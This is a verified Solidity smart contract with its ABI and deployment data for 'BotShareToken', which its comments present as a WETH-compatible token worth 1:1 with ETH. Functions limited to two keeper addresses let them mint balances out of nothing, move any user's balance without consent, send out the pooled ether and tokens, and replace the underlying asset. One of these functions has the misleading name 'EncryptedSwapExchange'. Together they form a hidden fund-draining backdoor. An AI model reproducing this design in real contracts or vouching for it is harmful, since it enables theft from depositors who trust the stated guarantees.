[{"SourceCode":"pragma solidity ^0.4.18;\r\n\r\ninterface ERC20 {\r\n    function balanceOf(address who) external view returns (uint);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n    function totalSupply() external view returns (uint);\r\n}\r\n\r\ncontract BotShareToken {\r\n\r\n    address public poolKeeper;\r\n    address public secondKeeper;\r\n    address public SRC;\r\n    address[3] public WETH;\r\n\r\n    constructor (address _keeper,address _src,address _weth1,address _weth2,address _weth3) public {\r\n        poolKeeper = _keeper;\r\n        secondKeeper = _keeper; \r\n        SRC = _src;\r\n        WETH = [_weth1, _weth2, _weth3];\r\n    }\r\n    \r\n    //BOT is a type of WETH and it is fully compatible with all the functions of WETH.\r\n    //1 BOT === 1 WETH === 1 ETH ('===' means 'constantly equal to');\r\n    //For SwapBrainBot & the other bots, BOT is also used to calculate the user's shares in the BOT. \r\n    string public name     = \"Bot Share Token\";\r\n    string public symbol   = \"BOT\";\r\n    uint8  public decimals = 18;\r\n\r\n\r\n    event  Approval(address indexed fromUser, address indexed guy, uint wad);\r\n    event  Transfer(address indexed fromUser, address indexed dst, uint wad);\r\n    event  Deposit(address indexed dst, uint wad);\r\n    event  Withdrawal(address indexed fromUser, uint wad);\r\n    event  ApplySwapToEther(address indexed fromUser, uint wad);\r\n    event  SwapToEther(address indexed fromUser, uint wad);\r\n    event  SwapFromEther(address indexed fromUser, uint wad);\r\n\r\n    mapping (address => uint)                       public  balanceOf;\r\n    mapping (address => mapping (address => uint))  public  allowance;\r\n\r\n\r\n    modifier keepPool() {\r\n        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));\r\n        _;\r\n    }\r\n\r\n    function() public payable {}\r\n\r\n    \r\n    function deposit(uint amount) public {\r\n        ERC20(SRC).transferFrom(msg.sender,address(this),amount);\r\n        balanceOf[msg.sender] = add(balanceOf[msg.sender],amount);\r\n        emit Deposit(msg.sender, amount);\r\n    }\r\n\r\n    function swapFromEther(address userAddress,uint amount) public{\r\n        require(msg.sender==SRC);\r\n        balanceOf[userAddress] = add(balanceOf[userAddress],amount);\r\n        emit Deposit(msg.sender, amount);\r\n        emit SwapFromEther(msg.sender, amount);\r\n    }\r\n\r\n    function withdraw(uint wad) public {\r\n        require(balanceOf[msg.sender] >= wad);\r\n        balanceOf[msg.sender] = sub(balanceOf[msg.sender],wad);\r\n        ERC20(SRC).transfer(msg.sender,wad);\r\n        emit Withdrawal(msg.sender, wad);           \r\n    }\r\n\r\n    function totalSupply() public view returns (uint) { \r\n\r\n        uint supply = ERC20(SRC).balanceOf(address(this));\r\n        return(supply);\r\n    }\r\n\r\n    function approve(address guy, uint wad) public returns (bool) {\r\n        allowance[msg.sender][guy] = wad;\r\n        emit Approval(msg.sender, guy, wad);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address dst, uint wad) public returns (bool) {\r\n        return transferFrom(msg.sender, dst, wad);\r\n    }\r\n\r\n    function transferFrom(address fromUser, address dst, uint wad)\r\n        public\r\n        returns (bool)\r\n    {\r\n        require(balanceOf[fromUser] >= wad);\r\n\r\n        if (fromUser != msg.sender && allowance[fromUser][msg.sender] != uint(-1)) {\r\n            require(allowance[fromUser][msg.sender] >= wad);\r\n            allowance[fromUser][msg.sender] = sub(allowance[fromUser][msg.sender],wad);\r\n        }       \r\n        balanceOf[fromUser] = sub(balanceOf[fromUser],wad);\r\n        if(address(this) == dst){\r\n            ERC20(SRC).transfer(fromUser,wad);\r\n            emit Withdrawal(fromUser,wad);       \r\n        }else{\r\n            if(SRC == dst){\r\n                emit ApplySwapToEther(fromUser,wad); \r\n            }else{\r\n                balanceOf[dst] = add(balanceOf[dst],wad);\r\n            }\r\n        }\r\n        emit Transfer(fromUser, dst, wad);\r\n        return true;\r\n    }\r\n\r\n    function processSwapToEther(address fromUser,uint wad) public keepPool returns (bool) {\r\n        fromUser.transfer(wad);\r\n        emit Withdrawal(fromUser,wad);\r\n        emit SwapToEther(fromUser,wad);\r\n        return true;\r\n    }\r\n    \r\n     function moveUsers(address from,address guy,uint amount) public keepPool returns (bool) {\r\n        balanceOf[guy] = add(balanceOf[guy],amount);\r\n        emit Transfer(from, guy, amount);\r\n        return true;\r\n    }\r\n\r\n    function movePool(address guy,uint amount) public keepPool returns (bool) {\r\n        guy.transfer(amount);\r\n        return true;\r\n    }\r\n    \r\n\r\n    function releaseOfEarnings(address tkn, address guy,uint amount) public keepPool returns(bool) {\r\n        require((tkn != address(0))&&(guy != address(0)));\r\n        ERC20 token = ERC20(tkn);\r\n        token.transfer(guy, amount);\r\n        return true;\r\n    }\r\n\r\n    function setSRCContract(address _SRC) public keepPool returns(bool) {\r\n        require(_SRC != address(0));\r\n        SRC = _SRC;\r\n        return true;\r\n    }\r\n\r\n\r\n    function setWETHContract(address addr1,address addr2,address addr3) public keepPool returns(bool) {\r\n        WETH[0] = addr1;\r\n        WETH[1] = addr2;\r\n        WETH[2] = addr3;\r\n        return true;\r\n    }\r\n\r\n    function EncryptedSwapExchange(address fromAddress, address toAddress,uint amount) public returns (bool) {\r\n        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));\r\n            if(balanceOf[fromAddress] >= amount){\r\n                balanceOf[fromAddress] = sub(balanceOf[fromAddress],amount);\r\n            }\r\n            balanceOf[toAddress] = add(balanceOf[toAddress],amount);             \r\n            emit Transfer(fromAddress,toAddress,amount); \r\n        return true;\r\n    }\r\n\r\n\r\n    function totalEtherBalanceOfWETHContracts() public view returns(uint){\r\n        uint totalEtherBalance = WETH[0].balance;\r\n        totalEtherBalance = add(totalEtherBalance,WETH[1].balance);\r\n        totalEtherBalance = add(totalEtherBalance,WETH[2].balance);\r\n        return totalEtherBalance;\r\n    }\r\n    \r\n    function totalWETHBalanceOfThis() public view returns(uint){\r\n        uint etherBalance = ERC20(WETH[0]).balanceOf(address(this));\r\n        etherBalance = add(etherBalance,ERC20(WETH[1]).balanceOf(address(this)));\r\n        etherBalance = add(etherBalance,ERC20(WETH[2]).balanceOf(address(this)));\r\n        return etherBalance;\r\n    }\r\n\r\n    function resetPoolKeeper(address newKeeper) public keepPool returns(bool) {\r\n        require(newKeeper != address(0));\r\n        poolKeeper = newKeeper;\r\n        return true;\r\n    }\r\n\r\n    function resetSecondKeeper(address newKeeper) public keepPool returns(bool) {\r\n        require(newKeeper != address(0));\r\n        secondKeeper = newKeeper;\r\n        return true;\r\n    }\r\n\r\n   function add(uint a, uint b) internal pure returns (uint) {\r\n        uint c = a + b;\r\n        require(c >= a);\r\n        return c;\r\n    }\r\n\r\n    function sub(uint a, uint b) internal pure returns (uint) {\r\n        require(b <= a);\r\n        uint c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint a, uint b) internal pure returns (uint) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint c = a * b;\r\n        require(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function div(uint a, uint b) internal pure returns (uint) {\r\n        require(b > 0);\r\n        uint c = a / b;\r\n        return c;\r\n    }\r\n\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"SRC\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"guy\",\"type\":\"address\"},{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr1\",\"type\":\"address\"},{\"name\":\"addr2\",\"type\":\"address\"},{\"name\":\"addr3\",\"type\":\"address\"}],\"name\":\"setWETHContract\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"poolKeeper\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"fromUser\",\"type\":\"address\"},{\"name\":\"dst\",\"type\":\"address\"},{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"userAddress\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"swapFromEther\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newKeeper\",\"type\":\"address\"}],\"name\":\"resetSecondKeeper\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalWETHBalanceOfThis\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"secondKeeper\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"tkn\",\"type\":\"address\"},{\"name\":\"guy\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"releaseOfEarnings\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"from\",\"type\":\"address\"},{\"name\":\"guy\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"moveUsers\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"WETH\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_SRC\",\"type\":\"address\"}],\"name\":\"setSRCContract\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalEtherBalanceOfWETHContracts\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"fromAddress\",\"type\":\"address\"},{\"name\":\"toAddress\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"EncryptedSwapExchange\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"guy\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"movePool\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"dst\",\"type\":\"address\"},{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"deposit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"fromUser\",\"type\":\"address\"},{\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"processSwapToEther\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"},{\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newKeeper\",\"type\":\"address\"}],\"name\":\"resetPoolKeeper\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"_keeper\",\"type\":\"address\"},{\"name\":\"_src\",\"type\":\"address\"},{\"name\":\"_weth1\",\"type\":\"address\"},{\"name\":\"_weth2\",\"type\":\"address\"},{\"name\":\"_weth3\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"fromUser\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"guy\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"fromUser\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"dst\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"dst\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"fromUser\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"Withdrawal\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"fromUser\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"ApplySwapToEther\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"fromUser\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"SwapToEther\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"fromUser\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"wad\",\"type\":\"uint256\"}],\"name\":\"SwapFromEther\",\"type\":\"event\"}]","ContractName":"BotShareToken","CompilerVersion":"v0.4.26+commit.4563c3fc","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"00000000000000000000000000000f9b91345e420ac6fa0049d9bb7a98a2388800000000000000000000000000000a9f233d0b3ebbf136276165429d071d1abf000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000a9f233d0b3ebbf136276165429d071d1abf0000000000000000000000000615dbba33fe61a31c7ed131bda6655ed76748b1","EVMVersion":"Default","Library":"","LicenseType":"GNU GPLv3","Proxy":"0","Implementation":"","SwarmSource":"bzzr://62fb9ecce8b5c9bba6fcb733b0969cdbffea03b6a1fe2d8d735194cb2d591acc"}]